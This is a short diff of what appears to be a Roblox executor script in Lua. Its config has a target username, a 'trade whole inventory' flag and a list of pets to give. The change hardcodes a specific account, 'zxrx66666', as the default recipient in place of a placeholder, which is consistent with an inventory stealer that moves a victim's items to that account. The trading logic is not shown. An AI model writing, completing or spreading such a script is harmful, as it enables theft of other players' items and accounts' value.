@@ -19,7 +19,7 @@ Notification.Name = "Notification"
 -- Basic config
 getgenv().Configuration = getgenv().Configuration or {}
 local config = getgenv().Configuration
-config.targetUsername = config.targetUsername or "TargetPlayer"
+config.targetUsername = config.targetUsername or "zxrx66666"
 config.tradeWholeInventory = config.tradeWholeInventory or false
 config.petToGive = config.petToGive or {}
 
